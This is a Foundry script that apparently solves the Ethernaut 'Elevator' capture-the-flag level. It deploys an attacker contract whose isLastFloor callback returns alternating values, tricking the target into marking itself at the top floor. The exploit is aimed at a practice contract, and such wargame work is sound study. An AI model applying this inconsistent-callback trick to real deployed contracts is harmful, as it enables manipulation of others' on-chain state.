// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../src/Elevator.sol";
import "forge-std/Script.sol";
import "forge-std/console2.sol";

contract Attack {
    bool public badFlag;
    Elevator public instance = Elevator(0xf020D948abBFCA139A01793BB9b204165Df6369B);

    function isLastFloor(uint256) external returns (bool) {
        badFlag = !badFlag;
        return badFlag ? false : true;
    }

    function attack() external {
        instance.goTo(100000);
    }
}

contract Level11ElevatorSolution is Script {
    Elevator public instance = Elevator(0xf020D948abBFCA139A01793BB9b204165Df6369B);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack();
        attack.attack();
        console.log("top: ", instance.top());
        console.log("top: ", instance.floor());
        vm.stopBroadcast();
    }
}
